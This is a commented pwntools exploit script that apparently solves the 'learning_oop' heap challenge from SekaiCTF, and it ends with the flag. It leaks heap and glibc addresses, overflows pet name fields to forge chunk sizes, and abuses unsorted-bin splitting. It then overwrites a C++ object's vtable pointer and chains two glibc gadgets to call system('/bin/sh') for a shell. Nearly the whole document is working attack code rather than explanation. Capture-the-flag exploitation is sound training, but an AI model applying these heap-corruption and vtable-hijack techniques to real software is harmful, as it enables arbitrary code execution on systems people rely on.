from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./learning_oop_patched', '''
    # # adopt a new horse as pet
    # b *(new_pet+469)
    # # call get_max_age function of horse object in update function (uncomment just after adopting final horse)
    # # b *(update+95)
    continue
''')

# p = remote('learning-oop-k4s00jagzqqx.chals.sekai.team', 1337, ssl=True)

# malloc a chunk of size 0x120, each of which represents a pet object with following fields:
# 1. 8 bytes for vtable+0x10 pointer of derived pet class (virtual functions table includes addresses of derived class's virtual functions that are overridden from base class's virtual functions) (C++ exclusive)
# 2. 0x100 bytes for name (0x100 bytes of "A"s by default)
# 3. 4 bytes for age (0 by default)
# 4. 4 bytes for fullness (10 by default)
# 5. 4 bytes for status (0x3 by default)
# each new pet will die after 10 rounds of loop, including current round, meaning that each chunk will be freed in 10 rounds of loop, including current round (explained later)
# 10 pets can be alive at most
def adopt_new_pet(name):
    p.sendlineafter(b"> ", b'1')
    # only adopt horse as pet, whose max age is largest among all pet types, which is 40 (explained later)
    p.sendlineafter(b": ", str(4).encode())
    # read in data for name field until a whitespace character is encountered, which is then set as null terminator
    # so it is necessary to avoid any type of whitespace characters in payloads
    p.sendlineafter(b": \n", name)
    p.recvuntil(b": ")
    # print out address of new horse object
    return p.recvline().strip()

# do nothing in count rounds of loop
# update function is called in each round of loop, which does following things for each pet:
# 1. minus current pet's fullness by 1 and check if fullness is 0, if so, let it die by freeing chunk
# 2. add current pet's age by 1 and check if age is greater than max age, if so, let it die by freeing chunk
# 3. if current pet is determined to die, name field of this pet object will be viewed as a string and printed out, its chunk will be freed, and its chunk pointer will be set to null
# reason why only horse is adopted as pet is that:
# with max age of 40 and fullness of 10 by defaultwhen adopted, only thing that determines whether or not a horse dies, aka a chunk is freed, is fullness field
# which makes a horse die, aka a chunk is freed, after 10 rounds of loop, including round when it is adopted, aka it is malloced
def do_nothing(count):
    for _ in range(count):
        p.sendlineafter(b"> ", b'0')

# normal leak techniques are useless in this C++ heap challenge since vtable+0x10 pointer pointer field in each object makes first qword of every heap chunk unaccessible

# Stage 1: leak heap base address
# adopt horse A
heap_base_addr = int(adopt_new_pet(b'A'*8), 16)-0x136d0  # heap_base_addr+0x136d0
log.info(f"heap base address: {hex(heap_base_addr)}")

# Stage 2: leak glibc base address through ingenious exploitation
# adopt horse B
adopt_new_pet(b'B'*8)  # heap_base_addr+0x137f0
# adopt horse C
adopt_new_pet(b'C'*8)  # heap_base_addr+0x13910
# adopt horse D
adopt_new_pet(b'D'*8)  # heap_base_addr+0x13a30
# adopt horse E
adopt_new_pet(b'E'*8)  # heap_base_addr+0x13b50
# adopt horse F
adopt_new_pet(b'F'*8)  # heap_base_addr+0x13c70
# let horse A die
do_nothing(4)
# horse A died, chunk at heap_base_addr+0x136d0 is freed
# adopt horse A again
# set age greater than 40, so that it will dies immediately in this round of loop
# overflow to fake chunk size of next chunk, aka horse B's chunk, from 0x121 to 0x481
adopt_new_pet(b'A'*0x110+p32(0x481))  # heap_base_addr+0x136d0
# horse A died, chunk at heap_base_addr+0x136d0 is freed
# horse B died, chunk of fake size 0x480 at heap_base_addr+0x137f0 is freed into unsorted bin
# adopt horse A again
adopt_new_pet(b'A'*8)  # heap_base_addr+0x136d0
# horse C died, chunk at heap_base_addr+0x13910 is freed
# adopt horse C again
# set fullness to 5, so that it will dies in 5 rounds of loop, including current round
adopt_new_pet(b'C'*0x100+p32(0)+p32(5))
# horse D died, chunk at heap_base_addr+0x13a30 is freed
# adopt horse D again
adopt_new_pet(b'D'*8)  # heap_base_addr+0x13a30
# horse E died, chunk at heap_base_addr+0x13b50 is freed
# adopt horse E again
# set fullness to 16, so that it will dies in 16 rounds of loop, including current round
# overflow to fake previous chunk size of next chunk, aka horse F's chunk, to 0x480
adopt_new_pet(b'E'*0x100+p32(0)+p32(16)+p32(0x480))
# horse F died, chunk at heap_base_addr+0x13c70 is freed
# adopt horse F again
adopt_new_pet(b'F'*8)  # heap_base_addr+0x13c70
# adopt horse B again
# horse B's chunk is splitted from chunk at heap_base_addr+0x137f0 in unsorted bin, leaving chunk in unsorted bin starting from heap_base_addr+0x13910 now, which is horse C's chunk address
# due to splitting, duplicate glibc addresses are placed at heap_base_addr+0x13910 and heap_base_addr+0x13918, aka horse C's vtable+0x10 pointer field and name field
adopt_new_pet(b'B'*0x8)  # heap_base_addr+0x137f0
# horse C died, a string starting from heap_base_addr+0x13918, aka horse C's name field, is printed out, chunk at heap_base_addr+0x13910 is freed
glibc_base_addr = u64(p.recvuntil(b" died :(", drop=True)[-6:].ljust(8, b'\x00'))-0x203b20
log.info(f"glibc base address: {hex(glibc_base_addr)}")
# let horse A, B, D, F die
do_nothing(10)
# horse A died, chunk at heap_base_addr+0x136d0 is freed
# horse D died, chunk at heap_base_addr+0x13a30 is freed
# horse F died, chunk at heap_base_addr+0x13c70 is freed
# horse B died, chunk at heap_base_addr+0x137f0 is freed
# now tache bin of size 0x120 looks like: horse B -> horse F -> horse D -> horse A -> horse C

# Stage 3: hijack object's vtable+0x10 pointer field in heap chunk with ingenious gadgets in glibc to pop a shell
GADGET_1 = glibc_base_addr+0x984df  # mov rdi, qword ptr [rdi+0x10]; call qword ptr [rax+0x380];
GADGET_2 = glibc_base_addr+0x16c0c6  # call qword ptr [rax+8];
glibc_e = ELF('./libc.so.6')
# adopt horse B again
# write glibc system address to heap_base_addr+0x137f8 within horse B's chunk
# write glibc binsh address to heap_base_addr+0x13800 within horse B's chunk
adopt_new_pet(p64(glibc_base_addr+glibc_e.sym.system)+p64(glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00'))))  # heap_base_addr+0x137f0
# adopt horse F again
adopt_new_pet(b'F'*8)  # heap_base_addr+0x13c70
# adopt horse D again
adopt_new_pet(b'D'*8)  # heap_base_addr+0x13a30
# horse E died, chunk at heap_base_addr+0x13b50 is freed
# adopt horse E again
# write GADGET_2 to heap_base_addr+0x13b70 within horse E's chunk
adopt_new_pet(b'E'*0x18+p64(GADGET_2))  # heap_base_addr+0x13b50
# adopt horse A again
# set fullness to any value but not 0 or whitespace characters to prevent horse A from dying immediately or payload from being truncated
# write GADGET_1 to heap_base_addr+0x137c8 within horse A's chunk
# overflow to hijack horse B's vtable+0x10 pointer field, writing heap_base_addr+0x137b0 to heap_base_addr+0x137f0 within horse B's chunk
adopt_new_pet((b'A'*0xf0+p64(GADGET_1)+b'A'*8+p32(0)+p32(0xffff)+p64(0x3)+p64(0x121)+p64(heap_base_addr+0x137b0))[:-1])  # heap_base_addr+0x136d0
# update function of this round of loop firstly checks if horse B satisfies conditions to die
# when checking fullness field, horse B's fullness field is 0xffff, which is greater than 0, so it will not die
# when checking age field, it seeks horse B's get_max_age function by looking at value in horse B's vtable+0x10 pointer field and adding 0x18 to it
# horse B's vtable+0x10 pointer field is polluted with heap_base_addr+0x137b0, and heap_base_addr+0x137b0+0x18 is polluted with GADGET_1
# so calling horse B's get_max_age function is calling GADGET_1 right now, with rdi and rax both pointing to horse B's chunk address
# GADGET_1 sets rdi=*(rdi+0x10)=*(heap_base_addr+0x137f0+0x10)=glibc_binsh_addr (polluted) and calls *(rax+0x380)=*(heap_base_addr+0x137f0+0x380)=GADGET_2 (polluted)
# so GADGET_1 calls GADGET_2 right now
# GADGET_2 calls *(rax+8)=*(heap_base_addr+0x137f0+0x8)=glibc_system_addr (polluted)
# so GADGET_2 calls system("/bin/sh\x00") right now to pop a shell

p.interactive()

# SEKAI{w0w!!!!!!!!_UM4Z1NG_3xpl0it_sk1llz!!!!}